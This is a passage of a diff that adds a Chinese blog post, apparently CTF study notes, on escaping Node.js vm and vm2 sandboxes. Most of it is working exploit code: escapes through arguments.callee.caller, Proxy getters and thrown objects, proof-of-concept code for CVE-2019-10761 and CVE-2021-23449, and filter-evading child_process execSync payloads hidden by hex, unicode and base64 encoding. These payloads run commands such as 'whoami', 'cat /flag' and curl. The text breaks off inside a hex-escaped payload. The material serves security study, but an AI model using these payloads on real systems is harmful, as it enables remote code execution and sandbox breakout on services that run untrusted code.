+<span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);
+<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello &#x27;</span> + res)</code></pre></div>
+
+<p>我们现在的<code>this</code>为<code>null</code>，并且也没有其他可以引用的对象，这时候想要逃逸我们要用到一个函数中的内置对象的属性<code>arguments.callee.caller</code>，它可以返回函数的调用者。</p>
+<p><strong>我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的<code>arguments.callee.caller</code>就会返回沙箱外的一个对象，我们在沙箱内就可以进行逃逸了</strong>。</p>
+<h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><div class="code-wrapper"><pre><code class="hljs coffeescript">const vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);
+const script = 
+`<span class="language-javascript">(<span class="hljs-function">() =&gt;</span> &#123;</span>
+<span class="language-javascript">    <span class="hljs-keyword">const</span> a = &#123;&#125;</span>
+<span class="language-javascript">    a.<span class="hljs-property">toString</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span>
+<span class="language-javascript">      <span class="hljs-keyword">const</span> cc = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>;</span>
+<span class="language-javascript">      <span class="hljs-keyword">const</span> p = (cc.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>))();</span>
+<span class="language-javascript">      <span class="hljs-keyword">return</span> p.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-title function_">toString</span>()</span>
+<span class="language-javascript">    &#125;</span>
+<span class="language-javascript">    <span class="hljs-keyword">return</span> a</span>
+<span class="language-javascript">  &#125;)()</span>`;
+
+const sandbox = <span class="hljs-built_in">Object</span>.create(<span class="hljs-literal">null</span>);
+const context = <span class="hljs-keyword">new</span> vm.createContext(sandbox);
+const res = vm.runInContext(script, context);
+console.log(<span class="hljs-string">&#x27;Hello &#x27;</span> + res)</code></pre></div>
+
+<p>创建了一个对象，我们重写了该对象的<code>toString</code>方法，通过<code>arguments.callee.caller</code>获得到沙箱外的一个对象，沙箱外在console.log中字符串拼接触发<code>toString</code>方法，</p>
+<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>如果沙箱外没有执行字符串的相关操作来触发这个toString，并且也没有可以用来进行恶意重写的函数，我们可以用<code>Proxy</code>来劫持属性</p>
+<div class="code-wrapper"><pre><code class="hljs coffeescript">const vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);
+
+const script = 
+`<span class="language-javascript"></span>
+<span class="language-javascript">(<span class="hljs-function">() =&gt;</span>&#123;</span>
+<span class="language-javascript">    <span class="hljs-keyword">const</span> a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, &#123;</span>
+<span class="language-javascript">        <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span>
+<span class="language-javascript">            <span class="hljs-keyword">const</span> cc = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>;</span>
+<span class="language-javascript">            <span class="hljs-keyword">const</span> p = (cc.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>))();</span>
+<span class="language-javascript">            <span class="hljs-keyword">return</span> p.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-title function_">toString</span>();</span>
+<span class="language-javascript">        &#125;</span>
+<span class="language-javascript">    &#125;)</span>
+<span class="language-javascript">    <span class="hljs-keyword">return</span> a</span>
+<span class="language-javascript">&#125;)()</span>
+<span class="language-javascript"></span>`;
+const sandbox = <span class="hljs-built_in">Object</span>.create(<span class="hljs-literal">null</span>);
+const context = <span class="hljs-keyword">new</span> vm.createContext(sandbox);
+const res = vm.runInContext(script, context);
+console.log(res.abc)</code></pre></div>
+
+<p><code>get:</code>这个钩子里写了一个恶意函数，当我们在沙箱外访问proxy对象的任意属性（不论是否存在）这个钩子就会自动运行</p>
+<p>感觉像重写了get方法，然后访问属性就触发，跟上面感觉差不多</p>
+<p>我最后是<code>console.log(&quot;hello &quot;+res);</code>有趣的是，再报错中执行了命令</p>
+<div class="code-wrapper"><pre><code class="hljs xquery">console.log(<span class="hljs-string">&quot;hello &quot;</span>+res);
+                    ^
+TypeError:<span class="hljs-built_in"> string</span> <span class="hljs-string">&quot;zeropeach\86136</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">&quot;</span> <span class="hljs-literal">is</span><span class="hljs-built_in"> not</span> a <span class="hljs-keyword">function</span>
+    <span class="hljs-keyword">at</span> Object.<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">anonymous</span>&gt;</span> (d:\ctf文件\nep\1.js:35:21)</span>
+<span class="language-xml">    。。。。。。</span></code></pre></div>
+
+<p>但是<code>console.log(res)</code>的结果却是<code>&#123;&#125;</code></p>
+<h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>沙箱的返回值返回的是我们无法利用的对象或者没有返回值</p>
+<p>我们可以借助异常，将沙箱内的对象抛出去，然后在外部输出</p>
+<div class="code-wrapper"><pre><code class="hljs coffeescript">const vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);
+
+const script = 
+`<span class="language-javascript"></span>
+<span class="language-javascript">    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, &#123;</span>
+<span class="language-javascript">        <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span>
+<span class="language-javascript">            <span class="hljs-keyword">const</span> cc = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>;</span>
+<span class="language-javascript">            <span class="hljs-keyword">const</span> p = (cc.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>))();</span>
+<span class="language-javascript">            <span class="hljs-keyword">return</span> p.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-title function_">toString</span>();</span>
+<span class="language-javascript">        &#125;</span>
+<span class="language-javascript">    &#125;)</span>
+<span class="language-javascript"></span>`;
+<span class="hljs-keyword">try</span> &#123;
+    vm.runInContext(script, vm.createContext(<span class="hljs-built_in">Object</span>.create(<span class="hljs-literal">null</span>)));
+&#125;<span class="hljs-keyword">catch</span>(e) &#123;
+    console.log(<span class="hljs-string">&quot;error:&quot;</span> + e) 
+&#125;</code></pre></div>
+
+<p>这里我们用catch捕获到了throw出的proxy对象，在console.log时由于将字符串与对象拼接，将报错信息和rce的回显一起带了出来。</p>
+<p>跟上面的一样</p>
+<h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> obj = &#123;&#125; <span class="hljs-comment">// 针对该对象的 message 属性定义一个 getter, 当访问 obj.message 时会调用对应的函数</span>
+obj.<span class="hljs-title function_">__defineGetter__</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;
+    <span class="hljs-keyword">const</span> c = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>
+    <span class="hljs-keyword">const</span> p = (c[<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>][<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>](<span class="hljs-string">&#x27;return pro&#x27;</span>+<span class="hljs-string">&#x27;cess&#x27;</span>))()
+    <span class="hljs-keyword">return</span> p[<span class="hljs-string">&#x27;mainM&#x27;</span>+<span class="hljs-string">&#x27;odule&#x27;</span>][<span class="hljs-string">&#x27;requi&#x27;</span>+<span class="hljs-string">&#x27;re&#x27;</span>](<span class="hljs-string">&#x27;child_pr&#x27;</span>+<span class="hljs-string">&#x27;ocess&#x27;</span>)[<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ecSync&#x27;</span>](<span class="hljs-string">&#x27;cat /flag&#x27;</span>).<span class="hljs-title function_">toString</span>();
+&#125;)
+<span class="hljs-keyword">throw</span> obj</code></pre></div>
+
+
+
+<h2 id="vm2"><a href="#vm2" class="headerlink" title="vm2"></a>vm2</h2><p>vm2包的目录结构</p>
+<p><img src="/../images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231121190950763.png" srcset="/img/loading.gif" lazyload alt="image-20231121190950763"></p>
+<ul>
+<li><code>cli.js</code>实现了可以在命令行中调用vm2 也就是bin下的vm2。</li>
+<li><code>contextify.js</code>封装了三个对象：<code>Contextify Decontextify propertyDescriptor</code>，并且针对global的Buffer类进行了代理。</li>
+<li><code>main.js</code> 是vm2执行的入口，导出了<code>NodeVM VM</code>这两个沙箱环境，还有一个<code>VMScript</code>实际上是封装了<code>vm.Script</code>。</li>
+<li><code>sandbox.js</code>针对global的一些函数和变量进行了拦截，比如<code>setTimeout，setInterval</code>等</li>
+</ul>
+<p>vm2相比vm做出很大的改进，其中之一就是利用了es6新增的proxy特性，从而使用钩子拦截对<code>constructor和__proto__</code>这些属性的访问。</p>
+<div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> &#123;<span class="hljs-variable constant_">VM</span>, <span class="hljs-title class_">VMScript</span>&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm2&#x27;</span>);
+
+<span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VMScript</span>(<span class="hljs-string">&quot;let a = 2;a;&quot;</span>);
+
+<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>((<span class="hljs-keyword">new</span> <span class="hljs-title function_">VM</span>()).<span class="hljs-title function_">run</span>(script));</code></pre></div>
+
+
+
+<p><img src="/../images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231121191439463.png" srcset="/img/loading.gif" lazyload alt="image-20231121191439463"></p>
+<p>相比于vm的沙箱环境，vm2最重要的一步就是引入<code>sandbox.js</code>并针对context做封装</p>
+<p>vm2出现过多次逃逸的问题，所以现有的代码被进行了大量修改，为了方便分析需要使用较老版本的vm2，但github上貌似将3.9以前的版本全都删除了</p>
+<h2 id="vm2沙箱绕过"><a href="#vm2沙箱绕过" class="headerlink" title="vm2沙箱绕过"></a>vm2沙箱绕过</h2><h3 id="CVE-2019-10761"><a href="#CVE-2019-10761" class="headerlink" title="CVE-2019-10761"></a>CVE-2019-10761</h3><p>vm2版本&lt;&#x3D;3.6.10</p>
+<div class="code-wrapper"><pre><code class="hljs coffeescript"><span class="hljs-string">&quot;use strict&quot;</span>;
+const &#123;VM&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm2&#x27;</span>);
+const untrusted = `<span class="language-javascript"></span>
+<span class="language-javascript"><span class="hljs-keyword">const</span> f = <span class="hljs-title class_">Buffer</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">write</span>;</span>
+<span class="language-javascript"><span class="hljs-keyword">const</span> ft = &#123;</span>
+<span class="language-javascript">        <span class="hljs-attr">length</span>: <span class="hljs-number">10</span>,</span>
+<span class="language-javascript">        <span class="hljs-title function_">utf8Write</span>(<span class="hljs-params"></span>)&#123;</span>
+<span class="language-javascript"></span>
+<span class="language-javascript">        &#125;</span>
+<span class="language-javascript">&#125;</span>
+<span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">r</span>(<span class="hljs-params">i</span>)&#123;</span>
+<span class="language-javascript">    <span class="hljs-keyword">var</span> x = <span class="hljs-number">0</span>;</span>
+<span class="language-javascript">    <span class="hljs-keyword">try</span>&#123;</span>
+<span class="language-javascript">        x = <span class="hljs-title function_">r</span>(i);</span>
+<span class="language-javascript">    &#125;<span class="hljs-keyword">catch</span>(e)&#123;&#125;</span>
+<span class="language-javascript">    <span class="hljs-keyword">if</span>(<span class="hljs-title function_">typeof</span>(x)!==<span class="hljs-string">&#x27;number&#x27;</span>)</span>
+<span class="language-javascript">        <span class="hljs-keyword">return</span> x;</span>
+<span class="language-javascript">    <span class="hljs-keyword">if</span>(x!==i)</span>
+<span class="language-javascript">        <span class="hljs-keyword">return</span> x+<span class="hljs-number">1</span>;</span>
+<span class="language-javascript">    <span class="hljs-keyword">try</span>&#123;</span>
+<span class="language-javascript">        f.<span class="hljs-title function_">call</span>(ft);</span>
+<span class="language-javascript">    &#125;<span class="hljs-keyword">catch</span>(e)&#123;</span>
+<span class="language-javascript">        <span class="hljs-keyword">return</span> e;</span>
+<span class="language-javascript">    &#125;</span>
+<span class="language-javascript">    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;</span>
+<span class="language-javascript">&#125;</span>
+<span class="language-javascript"><span class="hljs-keyword">var</span> i=<span class="hljs-number">1</span>;</span>
+<span class="language-javascript"><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;</span>
+<span class="language-javascript">    <span class="hljs-keyword">try</span>&#123;</span>
+<span class="language-javascript">        i=<span class="hljs-title function_">r</span>(i).<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return process&quot;</span></span>)(<span class="hljs-params"></span>);</span>
+<span class="language-javascript">        <span class="hljs-keyword">break</span>;</span>
+<span class="language-javascript">    &#125;<span class="hljs-keyword">catch</span>(x)&#123;</span>
+<span class="language-javascript">        i++;</span>
+<span class="language-javascript">    &#125;</span>
+<span class="language-javascript">&#125;</span>
+<span class="language-javascript">i.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;whoami&quot;</span>).<span class="hljs-title function_">toString</span>()</span>
+<span class="language-javascript"></span>`;
+<span class="hljs-keyword">try</span>&#123;
+    console.log(<span class="hljs-keyword">new</span> VM().run(untrusted));
+&#125;<span class="hljs-keyword">catch</span>(x)&#123;
+    console.log(x);
+&#125;</code></pre></div>
+
+<p>当调用函数次数超过当前环境的最大值时，我们正好调用沙箱外的函数，就会导致沙箱外的调用栈被爆掉，我们在沙箱内catch这个异常对象，就拿到了一个沙箱外的对象。举个例子：</p>
+<p>假设当前环境下最大递归值为1000，我们通过程序控制递归999次（注意这里说的递归值不是一直调用同一个函数的最大值，而是单次程序内调用函数次数的最大值，也就是调用栈的最大值）：</p>
+<div class="code-wrapper"><pre><code class="hljs scss"><span class="hljs-built_in">r</span>(i);      <span class="hljs-comment">// 该函数递归999次</span>
+
+f<span class="hljs-selector-class">.call</span>(ft);    <span class="hljs-comment">// 递归到第1000次时调用f这个函数，f为Buffer.prototype.write，就是下面图片的这个函数</span>
+
+this<span class="hljs-selector-class">.utf8Write</span>()   <span class="hljs-comment">// 递归到1001次时为该函数，是一个外部函数，所以爆栈时捕捉的异常也是沙箱外，从而返回了一个沙箱外的异常对象</span></code></pre></div>
+
+<h3 id="CVE-2021-23449"><a href="#CVE-2021-23449" class="headerlink" title="CVE-2021-23449"></a>CVE-2021-23449</h3><p>poc：</p>
+<div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> res = <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./foo.js&#x27;</span>)
+res.<span class="hljs-property">toString</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return this&quot;</span></span>)(<span class="hljs-params"></span>).<span class="hljs-property">process</span>.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;whoami&quot;</span>).<span class="hljs-title function_">toString</span>();</code></pre></div>
+
+<p>import()在JavaScript中是一个语法结构，不是函数，没法通过之前对<code>require</code>这种函数处理相同的方法来处理它，导致实际上我们调用import()的结果实际上是没有经过沙箱的，是一个外部变量。 我们再获取这个变量的属性即可绕过沙箱。 vm2对此的修复方法也很粗糙，正则匹配并替换了<code>\bimport\b</code>关键字，在编译失败的时候，报Dynamic Import not supported错误。</p>
+<h3 id="知识星球trick"><a href="#知识星球trick" class="headerlink" title="知识星球trick"></a>知识星球trick</h3><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-title class_">Symbol</span> = &#123;
+  <span class="hljs-keyword">get</span> <span class="hljs-title function_">toStringTag</span>()&#123;
+    <span class="hljs-keyword">throw</span> <span class="hljs-function"><span class="hljs-params">f</span>=&gt;</span>f.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return process&quot;</span></span>)(<span class="hljs-params"></span>)
+  &#125;
+&#125;;
+<span class="hljs-keyword">try</span>&#123;
+  <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>());
+&#125;<span class="hljs-keyword">catch</span>(f)&#123;
+  <span class="hljs-title class_">Symbol</span> = &#123;&#125;;
+  <span class="hljs-title function_">f</span>(<span class="hljs-function">()=&gt;</span>&#123;&#125;).<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;whoami&quot;</span>).<span class="hljs-title function_">toString</span>();
+&#125;</code></pre></div>
+
+<p><img src="/../images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231121201038924.png" srcset="/img/loading.gif" lazyload alt="image-20231121201038924"></p>
+<p>在vm2的原理中提到vm2会为对象配置代理并初始化，如果对象是以下类型：</p>
+<p><img src="/../images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231121200900952.png" srcset="/img/loading.gif" lazyload alt="image-20231121200900952"></p>
+<p>就会return <code>Decontextify.instance</code> 函数，这个函数中用到了Symbol全局对象，我们可以通过劫持Symbol对象的getter并抛出异常，再在沙箱内拿到这个异常对象就可以了</p>
+<h1 id="nodejs命令执行bypass"><a href="#nodejs命令执行bypass" class="headerlink" title="nodejs命令执行bypass"></a>nodejs命令执行bypass</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/237032#h2-0">https://www.anquanke.com/post/id/237032#h2-0</a></p>
+<div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">(<span class="hljs-string">&quot;child_process&quot;</span>)</span></span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;exe\x63Sync&quot;</span>]</span>(<span class="hljs-string">&quot;curl 127.0.0.1:1234&quot;</span>)
+
+<span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">(<span class="hljs-string">&quot;child_process&quot;</span>)</span></span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;exe\u0063Sync&quot;</span>]</span>(<span class="hljs-string">&quot;curl 127.0.0.1:1234&quot;</span>)
+
+<span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">(<span class="hljs-string">&#x27;child_process&#x27;</span>)</span></span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;exe&#x27;</span>%2b<span class="hljs-string">&#x27;cSync&#x27;</span>]</span>(<span class="hljs-string">&#x27;curl 127.0.0.1:1234&#x27;</span>)
+
+<span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">(<span class="hljs-string">&#x27;child_process&#x27;</span>)</span></span><span class="hljs-selector-attr">[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`]</span>(<span class="hljs-string">&#x27;curl 127.0.0.1:1234&#x27;</span>)
+
+<span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">(<span class="hljs-string">&quot;child_process&quot;</span>)</span></span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;exe&quot;</span>.concat(<span class="hljs-string">&quot;cSync&quot;</span>)]</span>(<span class="hljs-string">&quot;curl 127.0.0.1:1234&quot;</span>)
+
+<span class="hljs-function"><span class="hljs-title">eval</span><span class="hljs-params">(Buffer.from(<span class="hljs-string">&#x27;Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=&#x27;</span>,<span class="hljs-string">&#x27;base64&#x27;</span>)</span></span><span class="hljs-selector-class">.toString</span>())</code></pre></div>
+
+<h2 id="其他bypass"><a href="#其他bypass" class="headerlink" title="其他bypass"></a>其他bypass</h2><h3 id="Object-keys"><a href="#Object-keys" class="headerlink" title="Object.keys"></a>Object.keys</h3><p>实际上通过<code>require</code>导入的模块是一个<code>Object</code>，所以就可以用<code>Object</code>中的方法来操作获取内容。利用<code>Object.values</code>就可以拿到<code>child_process</code>中的各个函数方法，再通过数组下标就可以拿到<code>execSync</code></p>
+<div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">constructor</span>===<span class="hljs-title class_">Object</span>)
+<span class="hljs-comment">//true</span>
+<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>))[<span class="hljs-number">5</span>](<span class="hljs-string">&#x27;curl 127.0.0.1:1234&#x27;</span>)</code></pre></div>
+
+<h3 id="Reflect"><a href="#Reflect" class="headerlink" title="Reflect"></a>Reflect</h3><p>在js中，需要使用<code>Reflect</code>这个关键字来实现反射调用函数的方式。譬如要得到<code>eval</code>函数，可以首先通过<code>Reflect.ownKeys(global)</code>拿到所有函数，然后<code>global[Reflect.ownKeys(global).find(x=&gt;x.includes(&#39;eval&#39;))]</code>即可得到eval</p>
+<div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-title class_">Explainconsole</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(<span class="hljs-variable language_">global</span>))
+<span class="hljs-comment">//返回所有函数</span>
+<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">global</span>[<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(<span class="hljs-variable language_">global</span>).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;eval&#x27;</span>))])
+<span class="hljs-comment">//拿到eval</span></code></pre></div>
+
+<p>拿到eval之后，就可以常规思路rce了</p>
+<div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-variable language_">global</span>[<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(<span class="hljs-variable language_">global</span>).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;eval&#x27;</span>))](<span class="hljs-string">&#x27;global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;curl 127.0.0.1:1234&quot;)&#x27;</span>)</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs llvm"><span class="hljs-keyword">global</span>[Reflect.ownKeys(<span class="hljs-keyword">global</span>).find(<span class="hljs-keyword">x</span><span class="hljs-operator">=</span>&gt;<span class="hljs-keyword">x</span>.includes(&#x27;eval&#x27;))](&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">67</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">62</span>\<span class="hljs-keyword">x</span><span class="hljs-number">61</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>b\<span class="hljs-keyword">x</span><span class="hljs-number">52</span>\<span class="hljs-keyword">x</span><span class="hljs-number">65</span>\<span class="hljs-keyword">x</span><span class="hljs-number">66</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">65</span>\<span class="hljs-keyword">x</span><span class="hljs-number">63</span>\<span class="hljs-keyword">x</span><span class="hljs-number">74</span>\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">77</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">4</span>b\<span class="hljs-keyword">x</span><span class="hljs-number">65</span>\<span class="hljs-keyword">x</span><span class="hljs-number">79</span>\<span class="hljs-keyword">x</span><span class="hljs-number">73</span>\<span class="hljs-keyword">x</span><span class="hljs-number">28</span>\<span class="hljs-keyword">x</span><span class="hljs-number">67</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">62</span>\<span class="hljs-keyword">x</span><span class="hljs-number">61</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">29</span>\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">66</span>\<span class="hljs-keyword">x</span><span class="hljs-number">69</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">64</span>\<span class="hljs-keyword">x</span><span class="hljs-number">28</span>\<span class="hljs-keyword">x</span><span class="hljs-number">78</span>\<span class="hljs-keyword">x</span><span class="hljs-number">3</span>d\<span class="hljs-keyword">x</span><span class="hljs-number">3</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">78</span>\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">69</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">63</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">75</span>\<span class="hljs-keyword">x</span><span class="hljs-number">64</span>\<span class="hljs-keyword">x</span><span class="hljs-number">65</span>\<span class="hljs-keyword">x</span><span class="hljs-number">73</span>\<span class="hljs-keyword">x</span><span class="hljs-number">28</span>\<span class="hljs-keyword">x</span><span class="hljs-number">27</span>\<span class="hljs-keyword">x</span><span class="hljs-number">65</span>\<span class="hljs-keyword">x</span><span class="hljs-number">76</span>\<span class="hljs-keyword">x</span><span class="hljs-number">61</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">27</span>\<span class="hljs-keyword">x</span><span class="hljs-number">29</span>\<span class="hljs-keyword">x</span><span class="hljs-number">29</span>\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>d\<span class="hljs-keyword">x</span><span class="hljs-number">28</span>\<span class="hljs-keyword">x</span><span class="hljs-number">27</span>\<span class="hljs-keyword">x</span><span class="hljs-number">67</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">62</span>\<span class="hljs-keyword">x</span><span class="hljs-number">61</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">70</span>\<span class="hljs-keyword">x</span><span class="hljs-number">72</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">63</span>\<span class="hljs-keyword">x</span><span class="hljs-number">65</span>\<span class="hljs-keyword">x</span><span class="hljs-number">73</span>\<span class="hljs-keyword">x</span><span class="hljs-number">73</span>\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>d\<span class="hljs-keyword">x</span><span class="hljs-number">61</span>\<span class="hljs-keyword">x</span><span class="hljs-number">69</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">4</span>d\<span 